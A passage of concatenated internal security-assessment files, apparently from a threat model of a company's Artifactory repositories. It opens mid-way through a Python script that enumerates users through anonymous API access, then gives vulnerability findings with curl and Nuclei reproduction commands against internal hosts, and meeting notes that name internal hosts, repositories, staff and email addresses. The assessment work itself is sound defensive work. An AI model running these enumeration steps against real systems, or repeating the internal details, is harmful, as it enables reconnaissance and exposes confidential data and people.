    if details['createdBy'] not in users:
        print('Found user {}'.format(details['createdBy']))
        users.append(details['createdBy'])
    if details['modifiedBy'] not in users:
        print('Found user {}'.format(details['modifiedBy']))
        users.append(details['modifiedBy'])

# Function to safely load JSON
def safe_load_json(response_text):
    try:
        return json.loads(response_text)
    except json.JSONDecodeError as e:
        print(f"Failed to parse JSON: {e}")
        print(f"Response content: {response_text[:200]}")  # Print first 200 characters for debugging
        return None

# MAIN #########################################################################
url = sys.argv[1].rstrip('/')

session = requests.Session()
response = session.get(url + '/api/repositories', verify=False)

# Safely load JSON
repositories = safe_load_json(response.text)
if repositories is None:
    sys.exit(1)  # Exit if JSON is invalid

users = []

print('There are {} repositories to process'.format(len(repositories)))
for repository in repositories:
    try:
        response = session.get(url + '/api/storage/' + repository['key'], verify=False)
        if 'json' not in response.headers['Content-Type']:
            continue
        rep = safe_load_json(response.text)
        if rep is None:
            continue

        for child in rep['children']:
            uri = child['uri']
            response = session.get(url + '/api/storage/' + repository['key'] + uri, verify=False)
            if 'json' not in response.headers['Content-Type']:
                continue
            details = safe_load_json(response.text)
            if details is None:
                continue
            check_users(details)
    except Exception as e:
        print(f"An error occurred: {e}")
```
2. Change the file properties: `chmod +x artifactory_list_users.py`
3. Run the exploit code: `./artifactory_list_users.py "https://artifactory.corp.adobe.com/artifactory/"`

# Mitigation/Remediation:
We recommend restricting access to the “Deployed By” field so that only administrators can view it. Additionally, limit anonymous users’ ability to access any metadata associated with artifacts. Artifactory administrators should consider implementing a permissions check that validates a user’s privilege before displaying user-related data fields in the UI and API responses. Implementing security controls around API access is also critical, including using proper authorization tokens for actions that expose sensitive information. Further mitigation strategies include disabling anonymous access to Artifactory instances and using multi-factor authentication (MFA) for all deploying users.

**Sample Code for Mitigation (Pseudocode)**:
```javascript
if (user.role !== 'admin') {
   hideField('Deployed By');
}
```

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. https://cwe.mitre.org/data/definitions/202.html
4. https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
5. 


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Outdated Vulnerable Software - JFrog Artifactory - Critical (9.3).md
---

# Risk: Critical (9.3)
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:L`

**Explanation**: This vulnerability is critical because it can be exploited remotely with minimal complexity (low attack complexity) and without the need for authentication. It impacts the integrity and availability of the system, allowing attackers to poison artifact caches, potentially disrupting software distribution or deployment.

Based on the risk, the SLA to fix the ticket is **30** days. The team must fix this issue by **2025-04-13**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Description:
While conducting a security review of `Artifactory Access`, we observed the noted web application used outdated 3P software with known vulnerabilities. Specifically, the noted web application was running `artifactory@7.63.22` which is impacted by **CVE-2024-6915**. This involves **Improper Input Validation** in JFrog Artifactory versions below 7.90.6, including 7.63.22. This flaw allows attackers to manipulate or poison the artifact caches used in software builds and deployments. Cache poisoning can result in altered or malicious artifacts being distributed, posing a significant risk to the integrity of the software supply chain.

**Site-note: The team recently upgraded Artifactory to `Enterprise Plus 7.63.22 rev 76322900`. Some of these CVE may no longer apply, and we urge the team to double-check.**

# Impact:
If successfully exploited, an attacker could poison the artifact cache, leading to:
- **Integrity Compromise**: Malicious or modified artifacts may be stored in caches, leading to unauthorized code execution or supply chain attacks when these artifacts are later used in builds or deployments.
- **Availability Impact**: The attack could disrupt the normal functioning of systems relying on the affected artifact cache, potentially leading to downtime or degraded performance of services using compromised artifacts.

# Affected Assets:
## Affected Software:
- jfrog:artifactory:7.63.22

## Affected Host(s):
- https://artifactory.corp.adobe.com/ui/packages#/home

# Evidence:
## Nuclei:
```
[artifactory-anonymous-deploy] [http] [high] https://artifactory.corp.adobe.com/artifactory/ui/repodata?deploy=true
[artifactory-anonymous-deploy] [http] [high] https://artifactory-no1.corp.adobe.com/artifactory/ui/repodata?deploy=true
[artifactory-anonymous-deploy] [http] [high] https://artifactory-no1.corp.adobe.com/artifactory/ui/repodata?deploy=true ["repoTypesList":[{"repoKey":"pypi-gentech-tools-release-local","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-no1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-or1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-sj1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"}],"fileUploadMaxSizeMb""]
```

## Curl:
```bash
HTTP/1.1 200 OK
Date: Thu, 13 Mar 2025 18:06:30 GMT
Content-Type: application/vnd.org.jfrog.artifactory.repositories.RepositoryDetailsList+json
Connection: keep-alive
X-JFrog-Version: Artifactory/7.63.22 76322900
X-Artifactory-Id: a741e442ee48fdbcdfd35b04e51dc87cba5cec57
X-Artifactory-Node-Id: or1dra938.corp.adobe.com
Cache-Control: no-store
```

# Replicate Finding:
1. Visit the impacted URL in your web browser
2. Run the following command: `nuclei -v -t custom -t cloud -t code -t dast -t dns -t file -t headless -t http -t javascript -t network -t passive -t ssl -t workflows -severity critical,high,medium,low,info -o nuclei_output.out https://artifactory.corp.adobe.com`
3. Alternative, run this command: `curl -IkLs "https://artifactory.corp.adobe.com/artifactory/api/repositories"`

# Mitigation/Remediation:
We recommend updating the following:
1. **Update to a Secure Version**: Upgrade JFrog Artifactory to version **7.90.6** or later, where this vulnerability has been patched.
2. **Monitor for Suspicious Activity**: Regularly audit the artifact cache and monitor system logs for unusual or unauthorized access that could indicate a potential attack.

Lastly, we recommend hardening the system after patching and ensuring all installed software including the noted software are patched. For more details, please the references below!

**Be advised, the above patch should be applied to all other system(s) running the impacted software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Source_Code_Security_Standard.pdf
3. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Secure-Product-Lifecycle-Standard.pdf
4. https://www.cvedetails.com/vulnerability-search-by-cpe?f=1&page=1&cpe23str=cpe%3A2.3%3Aa%3Ajfrog%3Aartifactory%3A7.63.22
5. [National Vulnerability Database - CVE-2024-6915](https://nvd.nist.gov/vuln/detail/CVE-2024-6915)
6. [JFrog Security Advisories](https://jfrog.com/help/r/jfrog-release-information/jfrog-security-advisories)
7. [Tenable CVE-2024-6915 Overview](https://www.tenable.com/cve/CVE-2024-6915)



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Findings/Submitted/Artifactory Access - Artifactory Anonymous Access - High (8.2).md
---

# Risk: High (8.2)
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`

**Explanation:** This score is based on the fact that the vulnerability allows unauthenticated users to access sensitive information about the repositories. The attack vector is network-based (AV:N), the attack complexity is low (AC:L), no privileges are required (PR:N), and no user interaction is needed (UI:N). The scope is unchanged (S:U), and the impact on confidentiality is high, integrity is low, and there is no availability lost, as this is a sensitive information disclosure vulnerability (C:H/I:L/A:N).

Based on the risk, the SLA to fix the ticket is **N** days. The team must fix this issue by **DATE**, per Adobe's[Vulnerability Management Standard](https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Vulnerability-Management-Standard.pdf#page=2)

# Executive Summary
During a security review of JFrog Artifactory, it was discovered that anonymous access is allowed to the Artifactory instance. This means that any unauthenticated user can query the API and fetch all the repositories. JFrog Artifactory is a universal artifact repository manager, serving as a central hub for storing, managing, and distributing software artifacts like binaries, packages, and containers. The presence of anonymous access poses a significant security risk as it exposes sensitive information about the repositories to potential attackers.

## Detailed Finding
While performing a security assessment of `Artifactory`, we observed the noted web app had allowed anonymous access to its repositories. This means that any unauthenticated user can query the API and retrieve information about all available repositories. The presence of anonymous access is a critical security vulnerability as it exposes sensitive information about the repositories, including their URLs, descriptions, and types. This information can be leveraged by attackers to gain insights into the organization's software development and deployment processes. Additionally, it increases the risk of unauthorized access to the artifacts stored in these repositories.

## Impact:
If an attacker leverages this vulnerability, they can gain unauthorized access to sensitive information about the repositories hosted in JFrog Artifactory. This includes details such as repository URLs, descriptions, and types. With this information, attackers can potentially download or tamper with the artifacts stored in these repositories, leading to data breaches, intellectual property theft, and disruption of software development and deployment processes. Furthermore, attackers can use this information to launch targeted attacks against the organization, compromising its security posture.

# Affected Assets:
## Affected Host(s):
- 10.40.102.10 (artifactory-no1.corp.adobe.com) [443/tcp]

## Affected Repo(s):
```
- cargo-axle-release-local
- cargo-axle-release-no1
- cargo-axle-release-or1
- cargo-axle-release-sj1
- cargo-cai-local
- cargo-cai-no1
- cargo-cai-or1
- cargo-cai-sj1
- debian-edr-release-local
- debian-edr-release-no1
- debian-edr-release-or1
- debian-edr-release-sj1
- docker2-ipaas-public-local
- docker2-mcba-prod-local
- generic-DI-binary-local
- generic-adobesearch-cas-release-local
- generic-campaign-artifacts-dev-local
- generic-creative-cloud-release-local
- generic-creative-cloud-release-no1
- generic-creative-cloud-release-or1
- generic-creative-cloud-release-sj1
- generic-dibr-integration-test-local
- generic-dibr-integration-test-no1
- generic-dibr-integration-test-or1
- generic-dibr-integration-test-sj1
- generic-dilab-binary-local
- generic-dilab-binary-no1
- generic-dilab-binary-or1
- generic-dilab-binary-sj1
- generic-dva-pie-release-local
- generic-dva-pie-release-no1
- generic-dva-pie-release-or1
- generic-dva-pie-release-sj1
- generic-edr-release-local
- generic-edr-release-no1
- generic-edr-release-or1
- generic-edr-release-sj1
- generic-express-pdf-noida-dc-test-local
- generic-express-pdf-noida-dc-test-no1
- generic-express-pdf-noida-dc-test-or1
- generic-express-pdf-noida-dc-test-sj1
- generic-gauntlet-jenkins-update-site-release-local
- generic-mirror-qebasel-release-local
- generic-oracle-java-local
- generic-pca-release-local
- generic-xeng-srpm-release-local
- maven-adobe-oac-automation-release-local
- maven-adobe-oac-automation-release-no1
- maven-adobe-oac-automation-release-or1
- maven-adobe-oac-automation-release-sj1
- maven-adobe-oac-automation-snapshot-local
- maven-adobe-oac-automation-snapshot-no1
- maven-adobe-oac-automation-snapshot-or1
- maven-adobe-oac-automation-snapshot-sj1
- maven-apo-core-release-local
- maven-apo-core-release-no1
- maven-apo-core-release-or1
- maven-apo-core-release-sj1
- maven-di-build-utils-release-local
- maven-ps-android-dependencies-release-local
- npm-adobe-release-local
- npm-analytics-release-local
- npm-coralui-local
- npm-dunamis-release-local
- npm-react-release-local
- pypi-acromon-release-local
- pypi-acromon-release-no1
- pypi-acromon-release-or1
- pypi-acromon-release-sj1
- pypi-adsi-dev-local
- pypi-adsi-dev-no1
- pypi-adsi-dev-or1
- pypi-adsi-dev-sj1
- pypi-car-team-dev-local
- pypi-car-team-dev-no1
- pypi-car-team-dev-or1
- pypi-car-team-dev-sj1
- pypi-deltadataloaders-dev-local
- pypi-deltadataloaders-dev-no1
- pypi-deltadataloaders-dev-or1
- pypi-deltadataloaders-dev-sj1
- pypi-dibr-sandbox-release-local
- pypi-dibr-sandbox-release-no1
- pypi-dibr-sandbox-release-or1
- pypi-dibr-sandbox-release-sj1
- pypi-dibr-tools-dev-local
- pypi-gentech-tools-release-local
- pypi-gentech-tools-release-no1
- pypi-gentech-tools-release-or1
- pypi-gentech-tools-release-sj1
- pypi-hsdw-release-local
- pypi-hsdw-release-no1
- pypi-hsdw-release-or1
- pypi-hsdw-release-sj1
- pypi-identity-ethos-common-release-local
- pypi-identity-ethos-common-release-no1
- pypi-identity-ethos-common-release-or1
- pypi-identity-ethos-common-release-sj1
- pypi-onnx-tool-dev-local
- pypi-onnx-tool-dev-no1
- pypi-onnx-tool-dev-or1
- pypi-onnx-tool-dev-sj1
- pypi-pdfsky-dev-local
- pypi-pdfsky-dev-no1
- pypi-pdfsky-dev-or1
- pypi-pdfsky-dev-sj1
- pypi-releng-local
- pypi-smi-statstracker-ingester-release-local
- pypi-smi-statstracker-ingester-release-no1
- pypi-smi-statstracker-ingester-release-or1
- pypi-smi-statstracker-ingester-release-sj1
- pypi-th-dev-local
- pypi-th-dev-no1
- pypi-th-dev-or1
- pypi-th-dev-sj1
- pypi-tse-sdk-dev-local
- pypi-tse-sdk-dev-no1
- pypi-tse-sdk-dev-or1
- pypi-tse-sdk-dev-sj1
- pypi-tse-sdk-release-local
- pypi-tse-sdk-release-no1
- pypi-tse-sdk-release-or1
- pypi-tse-sdk-release-sj1
- rpm-edr-release-local
- rpm-edr-release-no1
- rpm-edr-release-or1
- rpm-edr-release-sj1
```

# Evidence:
## Request
```
GET /artifactory/ui/repodata?deploy=true HTTP/1.1
Host: artifactory.corp.adobe.com
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Connection: keep-alive
```

## Response
```
HTTP/1.1 200 OK
Date: Mon, 16 Sep 2024 20:00:19 GMT
Content-Type: application/json
Connection: keep-alive
X-JFrog-Version: Artifactory/7.63.21 76321900
X-Artifactory-Id: 095d6c039c985b29af09053ab1cbc068786681c8
X-Artifactory-Node-Id: or1dra936.corp.adobe.com
Access-Control-Allow-Methods: GET, POST, DELETE, PUT
Access-Control-Allow-Headers: X-Requested-With, Content-Type, X-Codingpedia
Cache-Control: no-store
SessionValid: false
Content-Length: 978

{"repoTypesList":[{"repoKey":"pypi-gentech-tools-release-local","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-no1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-or1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release-sj1","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"},{"repoKey":"pypi-gentech-tools-release","repoType":"Pypi","layoutPattern":"[orgPath]/[module]/[module]-[baseRev].[ext]","layoutFolderItegRevRegex":".*","layoutFileItegRevRegex":".*"}],"fileUploadMaxSizeMb":500}
```

# Replicate Finding:
Run the following command: `curl -kL-Xs -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46' 'https://artifactory.corp.adobe.com/artifactory/ui/repodata?deploy=true'`

# Mitigation/Remediation:
We recommend disabling anonymous access to JFrog Artifactory. This can be achieved by updating the Artifactory configuration to require authentication for accessing the repositories. The following steps can be followed to disable anonymous access:

1. Log in to the JFrog Artifactory administration console.
2. Navigate to 'Admin' > 'Security' > 'General'.
3. Disable the 'Allow Anonymous Access' option.
4. Save the changes.

Additionally, it is recommended to review and update the permissions for each repository to ensure that only authorized users have access to them. Implementing role-based access control (RBAC) can help to manage permissions effectively. Lastly, we recommend the following:
- Enable logging and monitoring of repository activity to detect unusual uploads.
- Implement signed artifacts and enforce artifact validation to ensure their integrity before deployment.

For more information & context, please see the reference section below.

**Please ensure that the above patch is applied to all other services, applications, and/or systems running the affected software that are managed by the team.**

# References:
1. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Patch-Management-Standard.pdf
2. https://inside.corp.adobe.com/content/dam/corporate-policies/documents/Network-Security-Standard.pdf
3. https://owasp.org/www-project-developer-guide/draft/foundations/secure_development/
4. https://owasp.org/www-project-integration-standards/writeups/owasp_in_sdlc/
5. https://owasp.org/www-project-mobile-top-10/2023-risks/m3-insecure-authentication-authorization
6. https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/
7. https://cwe.mitre.org/data/definitions/732.html
8. [JFrog Artifactory Security Best Practices](https://www.jfrog.com/confluence/display/JFROG/Security+Best+Practices)
9. [JFrog Artifactory User Guide](https://www.jfrog.com/confluence/display/JFROG/JFrog+Artifactory)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Kick-Off Meeting.md
---

## Highlights
- Q1 RT tried to steal code for firefly
	- RT has intel that source code is highly sawed after
- They learned the internal artifactory has no ACLs if you are on the network
	- Anonymous VPN users can access it
- Artifactory refers to https://artifactory.corp.adobe.com/
- Team is more likely to push the 
- RT recommends:
	- Set a meeting with Artifactory
	- Talk to Bryan/Jeff
- Lauren recommends:
	- Speak to Catherine Hart regarding paved road
		- Director of security architecture 
## Action Item:
- Meet w/ Atofactori team
- Meet w/ Catherine's team
- Find out how big/deep is the issue (this is a systemic problem)
	- Find a way to quantify the size of the issue
	- Find the impact of the issue to Adobe
- Work on mitigation
	- Reach out to sandeep's team & Ty from RT
	- Provide a solution we can use as a template
- Document everything


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 03-27-2025.md
---

## Highlights


# Action Items



---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 12-10-2024.md
---

Generated by AI. Be sure to check for accuracy.

Meeting notes:

- **OS Package Mirrors Usage:** Rick explained that OS package mirrors, such as Yum and Apt mirrors, are widely used for patch management in virtual machines, including those in the cloud. He mentioned that these mirrors are clones of public mirrors and are used to pull updates from repositories like Ubuntu.
    - **Usage of OS Mirrors:** Rick explained that OS package mirrors, such as Yum and Apt mirrors, are widely used for patch management in virtual machines, including those in the cloud. These mirrors are clones of public mirrors and are used to pull updates from repositories like Ubuntu. Rick mentioned that it would be difficult to determine exactly which virtual machines are pulling from these mirrors without checking the artifactory logs.
    - **Patch Management:** Patrick inquired about the specific teams using these mirrors. Rick clarified that it is general patch management and that it is open for use by various teams. He also mentioned that it would be challenging to identify all users without examining the artifactory logs.
    - **Historical Builds:** Thandesha raised a concern about the risk of reproducing 10-year-old builds if they are still pulling from old repositories. This highlights the challenge of maintaining historical data for long-term support (LTS) builds, such as those for Photoshop, which are only updated for critical vulnerabilities.
- **Artifactory and Private Repositories:** Thandesha discussed the use of Artifactory for private repositories and the advantages it offers, such as X-ray scanning and local caching. They emphasized that Artifactory is treated as an open-source window for the team.
    - **Advantages of Artifactory:** Thandesha highlighted the benefits of using Artifactory for private repositories, including X-ray scanning for security, local caching for efficiency, and other planning advantages. Artifactory is treated as an open-source window for the team, allowing them to access a wide range of tools and resources.
    - **Private Repositories:** Kevin asked whether the discussion was about remote repositories or private repositories. Thandesha confirmed that they were referring to private repositories and mentioned that they have better control over these repositories from the beginning, including various Python and Node repositories.
    - **Data Consumption:** Thandesha mentioned that a significant amount of data is consumed from Artifactory, not just for patch management but for a wider range of uses. This indicates the extensive reliance on Artifactory for various development and operational needs.
- **Anonymous Access in Artifactory:** Kevin raised concerns about allowing anonymous access in Artifactory, explaining that while some private repositories were allowed anonymous access, it poses security risks. He suggested the idea of having separate Artifactory instances for public registries with anonymous access.
    - **Security Risks:** Kevin expressed concerns about the security risks associated with allowing anonymous access in Artifactory. He explained that while some private repositories were allowed anonymous access, it poses a risk as users can add anonymous access through the Artifactory UI or API.
    - **Separate Instances:** Kevin suggested the idea of having separate Artifactory instances for public registries with anonymous access while locking down the existing Artifactory instance. This would help mitigate the security risks associated with anonymous access.
    - **Implementation Challenges:** Kevin acknowledged that implementing separate instances might be challenging due to dependencies. He raised the question of whether this approach would be acceptable to all parties involved.
- **AWS and Anonymous Access:** Sachin inquired about how anonymous access is handled on the AWS side. Kevin explained that AWS does not allow anonymous access, and users authenticate to access public repositories.
    
- **Artifactory Use Cases and Security:** Jon clarified that the use of Artifactory for operating system package management and reproducibility of builds for older versions is essential. He emphasized the need to document these use cases to address security concerns and ensure proper policy changes.
    - **Use Cases:** Jon emphasized the importance of documenting the use cases for Artifactory, particularly for operating system package management and reproducibility of builds for older versions. This documentation is crucial for addressing security concerns and ensuring proper policy changes.
    - **Security Concerns:** Jon highlighted the need to secure Adobe artifacts generated with Adobe source code and the importance of addressing the security concerns associated with Artifactory. He mentioned that the push for security affects the operating system package management use case in a way that is not easily resolved.
    - **Documentation Effort:** Sachin suggested documenting the specific use cases for Artifactory to present to the security team. Jon agreed and mentioned that he would work with Rick to write up the use cases. This documentation effort is essential for addressing security concerns and ensuring proper policy changes.
- **Documenting Use Cases:** Sachin suggested documenting the specific use cases for Artifactory to present to the security team. Jon agreed and mentioned that he would work with Rick to write up the use cases.
    
- **Security Exception Process:** Rohan raised the question of whether the changes to Artifactory should go through a security exception process. Thandesha expressed concerns about the difficulty of identifying all the repositories used in the past.
    
- **Security Concerns and Anonymous Access:** Gilles explained the security concerns that led to the decision to disable anonymous access in Artifactory, including the risk of accessing proprietary Adobe data and the potential for uploading malicious code.
    - **Security Risks:** Gilles explained the security concerns that led to the decision to disable anonymous access in Artifactory. These concerns include the risk of accessing proprietary Adobe data without authentication and the potential for uploading malicious code to repositories, which could be used to attack Adobe products.
    - **Historical Context:** Gilles mentioned that the push to disable anonymous access in Artifactory has been ongoing since 2018. The decision to finally lock it down was driven by the increasing risk of nation-state attacks using code repositories to target products.
- **Incremental Progress and Authentication:** Jon suggested making incremental progress towards a non-anonymous model for Artifactory, leveraging the project passport work with security and cloud operations to validate services and hosts with certificate-based credentials.
    - **Incremental Progress:** Jon proposed making incremental progress towards a non-anonymous model for Artifactory. This approach involves leveraging the project passport work with security and cloud operations to validate services and hosts with certificate-based credentials.
    - **Project Passport:** Jon explained that the project passport work, which involves workload and service identity, is set to start next year. This project aims to validate services and hosts with certificate-based credentials, providing a secure foundation for Artifactory and other dependencies.
    - **Authentication Solutions:** Jon emphasized the importance of having the infrastructure in place to validate services and hosts with certificate-based credentials. This solution would enable a full push towards a non-anonymous model for Artifactory, ensuring secure access to OS packages and other dependencies.
- **Future Steps and Documentation:** Vishal emphasized the need to document the use cases and repositories that require anonymous access for reproducibility of builds. Jon and Thandesha agreed to contribute to the documentation effort.
    

Follow-up tasks:

- **Document Use Cases:** Document the specific use cases for artifactory, particularly focusing on operating system package management and reproducibility of builds for older versions. (Jon, Rick)
- **Draft Document:** Send out the draft document detailing the use cases and repos concerned about reproducibility of LTS builds for review and contribution. (Jon)
- **Identify Dependencies:** Identify and document the dependencies required to build historic projects like Lightroom downloader to ensure continuity. (Dan, Thandesha)
- **Schedule Follow-Up Meeting:** Schedule a follow-up meeting in January to discuss the documented use cases and personas after the shutdown. (Kevin)
- **Send Dependency Information:** Send information on dependencies outside of the OS update use case to the group. (Thandesha)
- **Review Private Repos:** Identify how many private repos have anonymous access and ensure they are secured. (Sachin)


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 03-19-2025.md
---

# Highlights
- ATS is still not comfortable making the change
- Users can add anonymous users to their repos
- Sachin proposed monitoring of repos for anonymous partners
	- Artifactory was monitoring for that, and passing those violations
	- Security partners have since left the company
- Suggested finding the top 10 offenders and targeting them
	- Focus on non remote/mirror repos that contain Adobe code

# Action Items
- Gilles: Put the repos with anonymous access in a wiki
- Kevin: Will generate a list of remote mirror repos that contain Adobe 1P code


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 09-25-2024.md
---

## Highlights
- Artifactory was initially deployed with anonymous access
	- Internal security felt the risk was low because you needed VPN access
- Later security requested for anonymous access to be stopped
	- Teams came to a compromise
- Users added anonymous access to upload
- Kodiak is not planning on scanning for secrets

## Action Item:
- Service team (Niharika Rajwadha <nrajwadha@adobe.com>; Kevin Patterson <kpatters@adobe.com>)
	- Will meet internally & write a wiki/DFD (data flow diagram)
	- Find out implications of shutting off anonymous access
- TM
	- Cut the tickets found by EOD (09-25-24)
	- Research to see if we can scan for secrets


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 11-04-2024.md
---

## Highlights
- Artifactory is decommissioning anonymous access Q1 of FY25 (Feb)
- [Environment](https://wiki.corp.adobe.com/pages/viewpage.action?spaceKey=Artifactory&title=Access)
	- Corp/prod
		- Hillsboro, San Jose, Noida
	- Stage instance
		- artifactory-stg.corp.adobe.com (Corp)
		- artifactory-stg.adobeitc.com (Cloud/AWS)
		- artifactory-stg.azr0108.adobeitc.com (Cloud/Azure)
	- Cloud (anonymous access is NOT enabled)
		- 2 in AWS
		- 1 in Azure
- Virtually everyone at Adobe is using artifactory is using artifactory
	- Roughly 19k accounts are using the corp instances
- Developers add new repos through [developer home](https://devhome.corp.adobe.com/artifacts) (this is self-service)
	- They can use it to do the following:
		- Sync groups
		- Request access
		- Request scanning (X-RAY)
			- Teams have to manually opt into it
			- Kodiak is aware this is off by default
			- Infra may not be there to support it
		- Manage their repos
	- Users are admin of their repos
		- Can add individual users & other admins
- Cloud environment never got anonymous access because they felt the risk exposure is too great
	- Corp is behind VPN/Okta, and they felt exposure was minimal by comparison
	- Use cases vary widely, but the main reason was to facilitate access to public repos
		- Users were already accessing these repos (pip, maven, etc.) anonymously
	- NPM was throttling us but that was resolved
- Remote repos is a passive caching proxy (it is not a mirror)
	- Artifacts cached are the ones users requested (think DNS)
	- Artifactory does not check for the latest version of software
- There is no automated process to connect artifactory to Jenkins
	- Users manually handle the plumbing
	- Separate initiative to build a unified CI/CD 
		- Contact rokapoor@adobe.com
- Products using Artifactory
	- Photoshop
	- Illustrator
	- Lightroom
	- Firefly
	- Adobe Sign
	- Manganto
	- Workfront
- Biggest fear of the team is a complete failure of artifacts
	- Artifactory is not backed up in the traditional sense
	- Current strategy is using replication
	- Less than 5% of data is worth saving

## Action Item:
- Service team
	- Send a complete list of artifactory instances
	- Rahul will get back to me on the pipeline design (best practices)
	- Send info to the team handling the unified CI/CD pipeline
- DPSE
	- Have a kodiak/artifactory conversation for X-RAY


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 03-10-2025.md
---

## Jeff Feedback
- Write the global write permission
	- Target a specific team to assign them
- Write a wiki explaining and detailing the issue
- Find 2-4 teams that have this problem (write permission)
	- Provide a solution (wiki)
	- Issue them a tcket

## PASS Team Feedback
- Document everything, including the tickets/findings
	- File GRC risk - https://ccf.corp.adobe.com/dashboard/security-risk-management/risk-intake-form
- Escalate email CISO and cc CEO
- Highlight the fact the source code at Adobe is considered confidential
	- Customer source code is restricted

## Pawan Feedback
- Pick a small subset (1-2%) of the overall teams impacted by the anonymous read/write
	- Make sure those teams have a security partners
	- Cut tickets and assign to those security partners
		- Go to [#ask-security](https://adobe.enterprise.slack.com/archives/C054XCQE86N)and find who/which of the product teams have a security partners
- Put together a wiki & presentation with all findings
	- Put together wiki before you send out the email
	- PPT will be a presentation form of the wiki


---
# File: /Users/gbiagomba/Documents/Adobe/Security Assessments/Threat Model Artifactory Access/Meetings/Artifactory Access - Meeting 03-06-2025 - Summary.md
---

### Executive Summary

- **Impact Awareness**: Development teams are aware of potential impacts but lack detailed understanding.
- **Provisioning Solutions**: New deployments can integrate tokens, but older VMs face challenges.
- **Resource Allocation**: Technical solutions exist, but resource allocation is needed. Self-managed systems add complexity.
- **Software Lifecycle Overhaul**: ATS aims to revamp the OS lifecycle, with changes expected by 2027.
- **Governance Challenges**: ATS faces pushback from product teams, delaying governance goals.
- **Adobe's Readiness**: Adobe is not prepared for the change; separation of software builds from OS updates is necessary.
- **Proposed Approach**: Cap & grow strategy with staggered deployment. User education and resource provision are crucial.
- **FY Goal**: Formal proposal required to pitch this as a fiscal year goal.
- **ATS Stance**: ATS opposes moving forward, citing impacts on ethos and digital governance.

### Action Items

- Check with Pawan about the CA (Concept/Accept) program.
- Jon Macham to discuss with Kevin Patterson, Virshal (Kevin's manager), and Sashan Gard.

---

### Detailed Recap for Meeting Attendees

- **Impact Awareness**: Development teams are aware of the potential impact but lack detailed understanding of its scope.
- **Provisioning Solutions**: New provisioning can deploy with tokens built-in, but older VMs (around for 10 years) face significant challenges in cutting over.
- **Technical Solutions and Resource Allocation**: There are technical solutions available to address the issue, but it requires resource allocation. Additionally, self-managed systems, which are managed by individuals rather than ATS, add complexity.
- **Software Lifecycle Overhaul**: ATS plans to overhaul the software lifecycle of operating systems, but these changes and their impacts won't be seen until at least 2027.
- **Governance Challenges**: ATS has struggled to implement its governance goals due to pushback from product teams, who are requesting more time.
- **Adobe's Readiness**: Adobe is not ready to make the necessary changes. There is a need to separate software builds from OS updates.
